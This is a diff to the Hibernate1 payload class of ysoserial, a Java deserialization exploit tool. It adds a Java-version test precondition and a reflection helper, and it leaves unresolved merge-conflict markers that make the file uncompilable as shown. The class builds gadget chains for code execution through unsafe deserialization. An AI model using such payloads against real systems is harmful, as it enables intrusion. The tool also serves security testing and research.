@@ -17,7 +17,9 @@ import org.hibernate.type.Type;
 import org.hibernate.EntityMode;
 
 import ysoserial.payloads.annotation.Authors;
+import ysoserial.payloads.annotation.PayloadTest;
 import ysoserial.payloads.util.Gadgets;
+import ysoserial.payloads.util.JavaVersion;
 import ysoserial.payloads.util.PayloadRunner;
 import ysoserial.payloads.util.Reflections;
 
@@ -40,10 +42,17 @@ import ysoserial.payloads.util.Reflections;
  * @author mbechler
  */
 @Authors({ Authors.MBECHLER })
+@PayloadTest(precondition = "isApplicableJavaVersion")
 public class Hibernate1 implements ObjectPayload<Object>, DynamicDependencies {
+<<<<<<< HEAD
 	
 	// federicodotta - All supported (templateImpl) only with Hibernate5. Hibernate4 can only call getter.
 	// Add profile hibernate5 to compile with Maven and run ysoserial with -Dhibernate5 for using with Hibernate 5. 
+=======
+    public static boolean isApplicableJavaVersion() {
+        return JavaVersion.isAtLeast(7);
+    }
+>>>>>>> frohoff/master
 
     public static String[] getDependencies () {
         if ( System.getProperty("hibernate5") != null ) {
@@ -75,7 +84,7 @@ public class Hibernate1 implements ObjectPayload<Object>, DynamicDependencies {
         Class<?> getterIf = Class.forName("org.hibernate.property.Getter");
         Class<?> basicGetter = Class.forName("org.hibernate.property.BasicPropertyAccessor$BasicGetter");
         Constructor<?> bgCon = basicGetter.getDeclaredConstructor(Class.class, Method.class, String.class);
-        bgCon.setAccessible(true);
+        Reflections.setAccessible(bgCon);
 
         if ( !method.startsWith("get") ) {
             throw new IllegalArgumentException("Hibernate4 can only call getters");
